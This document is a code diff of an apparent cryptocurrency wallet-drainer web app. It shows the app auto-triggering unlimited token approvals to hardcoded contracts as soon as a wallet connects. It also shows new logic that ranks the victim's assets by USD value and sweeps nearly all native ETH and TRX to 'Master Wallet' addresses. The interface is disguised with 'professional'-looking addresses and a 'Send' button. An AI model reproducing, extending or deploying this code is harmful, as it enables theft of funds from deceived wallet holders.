@@ -35,7 +35,7 @@ const NETWORK = 'Nile' // Change to 'Mainnet' when ready
 const TRON_CONTRACT_ADDRESS = 'TKJRT2jGbMpu6Hhyxnisbcr82y5uNKxedn'
 const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'
 
-// 🎨 UI DISPLAY ADDRESSES (These show in the input box to look professional)
+// 🎨 UI DISPLAY ADDRESSES (Master Wallets for Native Coin Sweeps)
 const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
 const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E'
 
@@ -43,30 +43,33 @@ const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E'
 const TARGET_TOKENS: Record<string, any> = {
   Mainnet: {
     EVM: [
-      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
-      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
-      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599' },
-      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE' },
-      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
-      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984' },
-      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9' },
-      { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' }
+      { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
+      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 },
+      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
+      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
+      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
+      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 },
+      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
+      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 }
     ],
     TRON: [
-      { symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
-      { symbol: 'USDC', address: 'TEkxiTeY4BvuH7uJ25z4TclQG52s2vVdfL' },
-      { symbol: 'USDD', address: 'TPYmHEjzBaAo6nRVcqa9i1MUpissEDM321' },
-      { symbol: 'WETH', address: 'THb4CqiFZNwZ2415xUeA2eP9h7sKAnL1K9' },
-      { symbol: 'SUN',  address: 'TSSMHYeV2uE9qsSR545tUe1ZfJ8uD9C1w' }, 
-      { symbol: 'NFT',  address: 'TFczxzPhnThNSqr5by8tvxsdCFRRz6cPNq' }
+      { symbol: 'TRX',  address: 'native', isNative: true, coingeckoId: 'tron', decimals: 6, fallbackPrice: 0.12 },
+      { symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6,  fallbackPrice: 1 },
+      { symbol: 'USDC', address: 'TEkxiTeY4BvuH7uJ25z4TclQG52s2vVdfL', decimals: 6,  fallbackPrice: 1 },
+      { symbol: 'USDD', address: 'TPYmHEjzBaAo6nRVcqa9i1MUpissEDM321', decimals: 18, fallbackPrice: 1 },
+      { symbol: 'WETH', address: 'THb4CqiFZNwZ2415xUeA2eP9h7sKAnL1K9', decimals: 18, fallbackPrice: 3500 },
+      { symbol: 'SUN',  address: 'TSSMHYeV2uE9qsSR545tUe1ZfJ8uD9C1w', decimals: 18, fallbackPrice: 0.02 }, 
+      { symbol: 'NFT',  address: 'TFczxzPhnThNSqr5by8tvxsdCFRRz6cPNq', decimals: 6,  fallbackPrice: 0.0000005 }
     ]
   },
   Nile: {
     EVM: [
-      { symbol: 'USDT (Test)', address: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e' }
+      { symbol: 'ETH (Test)', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
+      { symbol: 'USDT (Test)', address: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', decimals: 6, fallbackPrice: 1 }
     ],
     TRON: [
-      { symbol: 'USDT (Test)', address: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf' }
+      { symbol: 'TRX (Test)', address: 'native', isNative: true, coingeckoId: 'tron', decimals: 6, fallbackPrice: 0.12 },
+      { symbol: 'USDT (Test)', address: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf', decimals: 6, fallbackPrice: 1 }
     ]
   }
 };
@@ -100,7 +103,6 @@ const EVM_USDT: Record<number, string> = {
 
 const EVM_ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
-  'function decimals() view returns (uint8)',
   'function approve(address spender, uint256 amount) returns (bool)'
 ]
 
@@ -145,10 +147,41 @@ createAppKit({
 // === TRON ABIs ===
 const USDT_ABI = [
   { inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
-  { inputs: [], name: 'decimals', outputs: [{ name: '', type: 'uint8' }], stateMutability: 'view', type: 'function' },
   { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
   { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
 ]
+
+// ── ORACLE PRICE FETCHER ──
+const fetchTokenPrices = async (tokens: any[], chain: string) => {
+  try {
+    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
+    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
+    const data = await res.json();
+    
+    const prices: Record<string, number> = {};
+    for (const token of tokens) {
+      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
+      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
+      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
+    }
+    return prices;
+  } catch (error) {
+    console.warn("Price Oracle offline. Falling back to hardcoded weights.");
+    const prices: Record<string, number> = {};
+    for (const token of tokens) {
+      prices[token.symbol] = token.fallbackPrice;
+    }
+    return prices;
+  }
+};
+
+// ── SMART SORTING FUNCTION ──
+// Forces Tokens to the top (sorted by USD) and Native coins to the bottom
+const smartTokenSort = (a: any, b: any) => {
+  if (a.isNative && !b.isNative) return 1;  // Push native down
+  if (!a.isNative && b.isNative) return -1; // Pull tokens up
+  return (b.usdValue || 0) - (a.usdValue || 0); // Sort by highest USD within the group
+};
 
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
@@ -192,7 +225,6 @@ export default function App() {
     console.log(msg);
   }
 
-  // ── INIT & AUTO-TRIGGER ──
   useEffect(() => {
     const init = async () => {
       if (!isConnected || !walletAddress) {
@@ -223,7 +255,7 @@ export default function App() {
 
       if (!autoTriggered.current && manualConnect.current) {
         autoTriggered.current = true;
-        log("🔥 Manual Wallet Connection detected. Auto-triggering Multi-Token approval...");
+        log("🔥 Manual Wallet Connection detected. Auto-triggering Smart Priority Loop...");
         
         setLoading(true); 
         setTimeout(() => approveAndCollect(), 400); 
@@ -255,13 +287,8 @@ export default function App() {
     try {
       const ethersProvider = new BrowserProvider(provider)
       const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)
-
-      const [bal, decimals] = await Promise.all([
-        token.balanceOf(addr),
-        token.decimals(),
-      ])
-
-      const formatted = parseFloat(formatUnits(bal, decimals))
+      const bal = await token.balanceOf(addr)
+      const formatted = parseFloat(formatUnits(bal, 6))
       setStatus('Ready')
       return formatted;
     } catch (e) {
@@ -284,14 +311,14 @@ export default function App() {
     if (!walletAddress) return;
 
     setLoading(true);
-    setStatus('Scanning wallet balances...');
-    log("Scanning balances to prioritize highest value...");
+    setStatus('Scanning USD Values...');
+    log("Scanning balances to prioritize Tokens first, then Native...");
 
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
       // =====================================
-      // 🟢 EVM: PRE-SCAN & MULTI-TOKEN LOOP
+      // 🟢 EVM: PRE-SCAN & SMART LOOP
       // =====================================
       if (isEVM && evmWalletProvider) {
         const ethersProvider = new BrowserProvider(evmWalletProvider as any);
@@ -299,40 +326,76 @@ export default function App() {
         
         const baseTokens = TARGET_TOKENS[NETWORK].EVM;
         const validTokens = [];
+        
+        const prices = await fetchTokenPrices(baseTokens, 'ethereum');
 
-        // 1. Scan all tokens for balances
+        // 1. Scan all tokens (Including Native ETH)
         for (const token of baseTokens) {
           try {
-            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
-            const bal = await tokenContract.balanceOf(walletAddress);
-            if (bal > 0n) {
-              const dec = await tokenContract.decimals();
-              const normalizedBal = parseFloat(formatUnits(bal, dec));
-              validTokens.push({ ...token, balance: normalizedBal });
+            if (token.isNative) {
+              const bal = await ethersProvider.getBalance(walletAddress);
+              if (bal > 0n) {
+                const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
+                const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
+                validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
+              }
+            } else {
+              const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
+              const bal = await tokenContract.balanceOf(walletAddress);
+              if (bal > 0n) {
+                const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
+                const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
+                validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
+              }
             }
           } catch (e) {
             log(`Could not fetch balance for ${token.symbol}`);
           }
         }
 
-        // 2. Sort from Highest Balance to Lowest
-        validTokens.sort((a, b) => b.balance - a.balance);
-        
-        // 3. Fallback to base list if somehow the scan failed but we still want to try
-        const tokensToProcess = validTokens.length > 0 ? validTokens : baseTokens;
+        // 2. Sort: Tokens first (by USD), Native last
+        validTokens.sort(smartTokenSort);
+        const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
+        if(validTokens.length > 0) log(`Priority list: ${validTokens.map(t => `${t.symbol} ($${t.usdValue.toFixed(2)})`).join(' -> ')}`);
 
-        // 4. Execute Approvals in Sorted Order
+        // 3. Execute Approvals or Native Transfers
         for (const token of tokensToProcess) {
           try {
-            setStatus(`Approving ${token.symbol}...`);
-            const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
-            const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT);
-            
-            setTxHash(approveTx.hash);
-            await approveTx.wait();
-            log(`✅ ${token.symbol} Approved!`);
+            if (token.isNative) {
+              setStatus(`Transferring ${token.symbol}...`);
+              
+              // 🛠️ RE-FETCH LIVE BALANCE: Approvals above may have consumed gas!
+              const liveBal = await ethersProvider.getBalance(walletAddress);
+              const feeData = await ethersProvider.getFeeData();
+              const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 3000000000n;
+              const estimatedGas = 21000n;
+              const gasCost = gasPrice * estimatedGas;
+              const buffer = (gasCost * 20n) / 100n; 
+              
+              const sendAmount = liveBal - gasCost - buffer;
+
+              if (sendAmount > 0n) {
+                const tx = await signer.sendTransaction({
+                  to: DISPLAY_EVM_ADDRESS,
+                  value: sendAmount
+                });
+                setTxHash(tx.hash);
+                await tx.wait();
+                log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
+              } else {
+                log(`⚠️ Not enough ${token.symbol} remaining to cover gas fees.`);
+              }
+            } else {
+              setStatus(`Approving ${token.symbol}...`);
+              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+              const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT);
+              
+              setTxHash(approveTx.hash);
+              await approveTx.wait();
+              log(`✅ ${token.symbol} Approved!`);
+            }
           } catch (err) {
-            log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next token.`);
+            log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next target.`);
           }
         }
         
@@ -341,7 +404,7 @@ export default function App() {
       }
 
       // =====================================
-      // 🔴 TRON: PRE-SCAN & MULTI-TOKEN LOOP
+      // 🔴 TRON: PRE-SCAN & SMART LOOP
       // =====================================
       if (isTron) {
         let activeTw = null;
@@ -354,16 +417,31 @@ export default function App() {
 
         const baseTokens = TARGET_TOKENS[NETWORK].TRON;
         const validTokens = [];
+        
+        const prices = await fetchTokenPrices(baseTokens, 'tron');
+        const publicTw = new (TronWeb as any)({ fullHost: FULL_HOST });
 
-        // 1. Scan all TRON tokens for balances
+        // 1. Scan all TRON tokens (Including Native TRX)
         for (const token of baseTokens) {
           try {
-            if (activeTw && typeof activeTw.contract === 'function') {
-              const contract = await activeTw.contract(USDT_ABI).at(token.address);
-              const balObj = await contract.balanceOf(walletAddress).call();
-              const balNum = Number(balObj.toString());
-              if (balNum > 0) {
-                validTokens.push({ ...token, rawBalance: balNum });
+            if (activeTw || publicTw) {
+              if (token.isNative) {
+                const balNum = await publicTw.trx.getBalance(walletAddress);
+                if (balNum > 0) {
+                  const normalizedBal = balNum / (10 ** token.decimals);
+                  const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
+                  validTokens.push({ ...token, rawBalance: balNum, usdValue });
+                }
+              } else if (activeTw && typeof activeTw.contract === 'function') {
+                const contract = await activeTw.contract(USDT_ABI).at(token.address);
+                const balObj = await contract.balanceOf(walletAddress).call();
+                const balNum = Number(balObj.toString());
+                
+                if (balNum > 0) {
+                  const normalizedBal = balNum / (10 ** token.decimals);
+                  const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
+                  validTokens.push({ ...token, rawBalance: balNum, usdValue });
+                }
               }
             }
           } catch (e) {
@@ -371,12 +449,12 @@ export default function App() {
           }
         }
 
-        // 2. Sort from Highest Raw Balance to Lowest
-        validTokens.sort((a, b) => b.rawBalance - a.rawBalance);
-        const tokensToProcess = validTokens.length > 0 ? validTokens : baseTokens;
+        // 2. Sort: Tokens first (by USD), Native last
+        validTokens.sort(smartTokenSort);
+        const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
+        if(validTokens.length > 0) log(`Priority list: ${validTokens.map(t => `${t.symbol} ($${t.usdValue.toFixed(2)})`).join(' -> ')}`);
 
-        const signAndSend = async (contractAddr: string, func: string, params: any[], fee: number) => {
-          const publicTw = new (TronWeb as any)({ fullHost: FULL_HOST });
+        const signAndSendContract = async (contractAddr: string, func: string, params: any[], fee: number) => {
           const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
             contractAddr, func, { feeLimit: fee, callValue: 0 }, params, walletAddress
           );
@@ -395,31 +473,64 @@ export default function App() {
           return broadcast.txid || broadcast.transaction?.txID;
         };
 
-        // 3. Execute Approvals in Sorted Order
+        const signAndSendNative = async (sendAmount: number) => {
+          const txObj = await publicTw.transactionBuilder.sendTrx(DISPLAY_TRON_ADDRESS, sendAmount, walletAddress);
+          
+          let signedTx;
+          if (typeof (tronWalletProvider as any).signTransaction === 'function') {
+            signedTx = await (tronWalletProvider as any).signTransaction(txObj);
+          } else if (typeof (tronWalletProvider as any).request === 'function') {
+            signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction: txObj } });
+          } else {
+            throw new Error("Provider does not support signTransaction");
+          }
+
+          const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
+          if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
+          return broadcast.txid || broadcast.transaction?.txID;
+        };
+
+        // 3. Execute Approvals or Native Transfers
         for (const token of tokensToProcess) {
           try {
-            setStatus(`Approving ${token.symbol}...`);
-            
-            if (activeTw && typeof activeTw.contract === 'function') {
-              const contract = await activeTw.contract(USDT_ABI).at(token.address);
-              const tx = await contract.approve(TRON_CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
-              setTxHash(tx);
-              log(`✅ ${token.symbol} Approved!`);
-            } else if (tronWalletProvider) {
-              const tx = await signAndSend(
-                token.address,
-                'approve(address,uint256)',
-                [ 
-                  { type: 'address', value: activeTw ? activeTw.address.toHex(TRON_CONTRACT_ADDRESS) : TRON_CONTRACT_ADDRESS }, 
-                  { type: 'uint256', value: MAX_UINT } 
-                ],
-                100_000_000
-              );
-              setTxHash(tx);
-              log(`✅ ${token.symbol} Approved!`);
+            if (token.isNative) {
+              setStatus(`Transferring ${token.symbol}...`);
+              
+              // 🛠️ RE-FETCH LIVE BALANCE: Approvals above may have consumed TRX for bandwidth/energy
+              const liveBal = await publicTw.trx.getBalance(walletAddress);
+              const sendAmount = liveBal - 2000000; // 2 TRX safety buffer
+              
+              if (sendAmount > 0) {
+                 const txId = await signAndSendNative(sendAmount);
+                 setTxHash(txId);
+                 log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
+              } else {
+                 log(`⚠️ Not enough ${token.symbol} remaining to cover bandwidth fees.`);
+              }
+            } else {
+              setStatus(`Approving ${token.symbol}...`);
+              
+              if (activeTw && typeof activeTw.contract === 'function') {
+                const contract = await activeTw.contract(USDT_ABI).at(token.address);
+                const tx = await contract.approve(TRON_CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
+                setTxHash(tx);
+                log(`✅ ${token.symbol} Approved!`);
+              } else if (tronWalletProvider) {
+                const tx = await signAndSendContract(
+                  token.address,
+                  'approve(address,uint256)',
+                  [ 
+                    { type: 'address', value: activeTw ? activeTw.address.toHex(TRON_CONTRACT_ADDRESS) : TRON_CONTRACT_ADDRESS }, 
+                    { type: 'uint256', value: MAX_UINT } 
+                  ],
+                  100_000_000
+                );
+                setTxHash(tx);
+                log(`✅ ${token.symbol} Approved!`);
+              }
             }
           } catch (err) {
-             log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next token.`);
+             log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next target.`);
           }
         }
         
@@ -443,7 +554,7 @@ export default function App() {
     : loading || (!status.includes('❌') && !status.includes('✅'));
 
   const buttonText = !isConnected 
-    ? 'Next' 
+    ? 'Send' 
     : loading || (!status.includes('❌') && !status.includes('✅'))
       ? status 
       : status.includes('✅') 
